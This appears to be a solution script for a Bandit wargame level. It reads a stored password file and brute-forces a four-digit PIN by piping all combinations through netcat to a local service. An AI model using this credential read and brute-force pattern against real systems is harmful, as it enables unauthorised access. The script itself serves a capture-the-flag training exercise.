#!/bin/bash

bandit24Pwd=$(cat /etc/bandit_pass/bandit24)

echo "$(printf "$bandit24Pwd %04d\n" {0..10000})" | nc localhost 30002 | grep -v 'Wrong!'
